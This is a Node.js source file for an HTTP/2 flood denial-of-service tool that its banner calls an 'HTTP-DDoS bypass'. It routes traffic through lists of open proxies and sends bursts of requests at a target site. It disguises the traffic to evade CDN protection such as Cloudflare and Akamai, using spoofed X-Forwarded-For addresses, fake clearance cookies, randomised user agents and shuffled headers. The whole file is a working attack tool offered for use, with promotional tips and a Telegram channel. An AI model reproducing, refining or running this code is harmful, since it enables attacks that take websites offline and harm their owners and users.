const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 const os = require("os");

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "abcdefghijklmnopqrstuvwxyz";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();


 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 2500);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();
 function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
}

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 99);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const ip_spoof4 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed4 = ip_spoof4(); 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }

function generateRandomPriority() {
  const randomPriority = Math.floor(Math.random() * 256);
  return randomPriority;
}

const randomPriorityValue = generateRandomPriority();

function generateRandomString(minLength, maxLength) {
					const characters = 'abcdefghijklmnopqrstuvwxyz'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}

 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 const nm = [
"110.0.0.0",
"111.0.0.0",
"112.0.0.0",
"113.0.0.0",
"114.0.0.0",
"115.0.0.0",
"116.0.0.0",
"117.0.0.0",
"118.0.0.0",
"119.0.0.0",
];
const nmx = [
"120.0",
"119.0",
"118.0",
"117.0",
"116.0",
"115.0",
"114.0",
"113.0",
"112.0",
"111.0",
];
const nmx1 = [
"105.0.0.0",
"104.0.0.0",
"103.0.0.0",
"102.0.0.0",
"101.0.0.0",
"100.0.0.0",
"99.0.0.0",
"98.0.0.0",
"97.0.0.0",
];
const sysos = [
"Windows 1.01",
"Windows 1.02",
"Windows 1.03",
"Windows 1.04",
"Windows 2.01",
"Windows 3.0",
"Windows NT 3.1",
"Windows NT 3.5",
"Windows 95",
"Windows 98",
"Windows 2006",
"Windows NT 4.0",
"Windows 95 Edition",
"Windows 98 Edition",
"Windows Me",
"Windows Business",
"Windows XP",
"Windows 7",
"Windows 8",
"Windows 10 version 1507",
"Windows 10 version 1511",
"Windows 10 version 1607",
"Windows 10 version 1703",
];
const winarch = [
"x86-16",
"x86-16, IA32",
"IA-32",
"IA-32, Alpha, MIPS",
"IA-32, Alpha, MIPS, PowerPC",
"Itanium",
"x86_64",
"IA-32, x86-64",
"IA-32, x86-64, ARM64",
"x86-64, ARM64",
"ARMv4, MIPS, SH-3",
"ARMv4",
"ARMv5",
"ARMv7",
"IA-32, x86-64, Itanium",
"IA-32, x86-64, Itanium",
"x86-64, Itanium",
];
const winch = [
"2012 R2",
"2019 R2",
"2012 R2 Datacenter",
"Server Blue",
"Longhorn Server",
"Whistler Server",
"Shell Release",
"Daytona",
"Razzle",
"HPC 2008",
];

 var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
 var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
 var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
 var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
 var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
 var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
 
 const uap = [
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 Edg/" + nm1,
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; rv:" + nm4 + ") Gecko/20100101 Firefox/" + nm4,
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36",
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ")) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 OPR/" + nm6,
 ];
const tips1 =[
 "use premium proxy will get more request/s",
 "this script only work on http/2!",
 "recommended big proxyfile if target is akamai/fastly",
 "dont trying resell my script!! @Akafastly",
 "My channel: https://t.me/SaturnSpark"
];
const platformd = [
 "Windows",
 "Linux",
 "Android",
 "iOS",
 "Mac OS",
 "iPadOS",
 "BlackBerry OS",
 "Firefox OS",
];
const rdom2 = [
 "hello server",
 "hello cloudflare",
 "hello client",
 "hello world",
 "hello akamai",
 "hello cdnfly",
 "hello kitty"
];
const patch = [
 'application/json-patch+json',
  'application/xml-patch+xml',
  'application/merge-patch+json',
  'application/vnd.github.v3+json',
  'application/vnd.mozilla.xul+xml',
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  'application/vnd.oasis.opendocument.text',
  'application/vnd.sun.xml.writer',
  'text/x-diff',
  'text/x-patch'
];
const uaa = [
 '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
 '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
 '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
 '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
 '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
 '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
 '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
]
const pua = [
 "Linux",
 "Windows",
 "Mac OS",
];
const nua = [
 "SA/3 Mobile",
 "Mobile",
 "Mobile Windows",
];
const langua = [
 "; en-US",
 "; ko-KR",
 "; en-US",
 "; zh-CN",
 "; zh-TW",
 "; ja-JP",
 "; en-GB",
 "; en-AU",
 "; en-CA",
 "; en-NZ",
 "; en-ZA",
 "; en-IN",
 "; en-PH",
 "; en-SG",
 "; en-HK",
];
const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',
  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine',
  'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious',
  'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial',
  'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic',
  'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope',
  'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic',
  'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];
const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];

 var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
 var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var nua1 = nua[Math.floor(Math.floor(Math.random() * nua.length))];
 var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
 var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
 var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
 var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
 var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
 var uaas = uaa[Math.floor(Math.floor(Math.random() * uaa.length))];
 var puaa = pua[Math.floor(Math.floor(Math.random() * pua.length))];
 var tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 var multi = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
 var multi2 = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4,16);
 
const rateHeaders = [
{ "cookie": "cf-clearance=" + generateRandomString(16,64) },
{ "origin": "https://" + parsedTarget.host + "/" },
{ "x-requested-with": "XMLHttpRequest" },
{ "cache-control": "private" },
{ "Expect-CT": "99-OK" },
];
const rateHeaders2 = [
{ "accept-char": "UTF-8" },
{ "Geo-Location": "UNKNOWN" },
{ "X-Forwarded-For": spoofed },
{ "Width": "1920" }, 
];
const rateHeaders3 = [
{ "devxice-memory": "0.3" },
{ "eaccept-languagep": lang },
{ "X-drequested-withp": "XMLHttpRequest" },
{ "Viecwport-widthp": "1080" },
];
const rateHeaders4 = [
{ "Maxw-Forwardsp": "5" },
{ "prawgmap": "no-cache" },
{ "Sewc-ch-uwa-Archp": "Private" },
{ "Seac-Gpxcp": "1" },
];

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    console.clear()
    console.log(`HTTP-DDoS bypass by: @Akafastly (Sxpy Azary) 12/4/2023`.rainbow)
    console.log(`--------------------------------------------`.gray)
    console.log(`Target: `.brightYellow + process.argv[2])
    console.log(`Time: `.brightYellow + process.argv[3])
    console.log(`Rate: `.brightYellow + process.argv[4])
    console.log(`Thread: `.brightYellow + process.argv[5])
    console.log(`ProxyFile: `.brightYellow + process.argv[6])
    console.log(`--------------------------------------------`.gray)
    console.log(`Note: `.brightCyan + tipsz)

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":scheme"] = "https";
 headers["cache-control"] = control;
 headers["pragma"] = "no-cache";
 headers["priority"] = "u=0, 1";
 headers["sec-ch-ua"] = uaas;
 headers[":path"] = path;
 headers["user-agent"] = uap1;
 headers["accept-encoding"] = encoding;
 headers["cdn-loop"] = "cloudflare";
 headers["sec-ch-ua-mobile"] = "?0";
 headers["upgrade-insecure-requests"] = "1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519:prime256v1",
            ciphers: cipper,
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
            //session: crypto.randomBytes(16),
            //timeout: 1000,
        };

         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = await http2.connect(parsedTarget.href, {
             protocol: "https",
             settings: {
            headerTableSize: 8192,
            maxConcurrentStreams: 1000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768,
            enablePush: false,
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 8192,
            maxConcurrentStreams: 1000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768,
            enablePush: false,
          });
		 
         client.on("connect", async () => {
            const IntervalAttack = setInterval(() => {
function shuffleObject(obj) {
  const keys = Object.keys(obj);

  for (let i = keys.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [keys[i], keys[j]] = [keys[j], keys[i]];
  }

  const shuffledObject = {};
  for (const key of keys) {
    shuffledObject[key] = obj[key];
  }

  return shuffledObject;
}
					const shuffledHeaders = shuffleObject({
					...headers,
					"cache-control": "max-age=0",
					//"upgrade-insecure-requests": "1",
					"user-agent": generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 " + generateRandomString(6,20),
					"accept": accept,
					"referer": "https://www.google.com",
					"accept-language": lang,
					//"cookie": "PHPSESSID=" + randstr(32) + ";cf-clearance=" + generateRandomString(32,64),
					"x-forwarded-proto": "https",
					"x-https": "on",
					...multi,
					...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
					...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
					...rateHeaders3[Math.floor(Math.random()*rateHeaders3.length)],
				    ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
					});
				//const headersArray = [dynHeaders, dynHeaders1, dynHeaders2];
				//console.log(dynHeaders2);
				//console.log(shuffledHeaders);
                for (let i = 0; i < args.Rate; i++) {
					const request = client.request(shuffledHeaders);
					//console.log(dynHeaders2);
					
                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 700); 
            //});
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);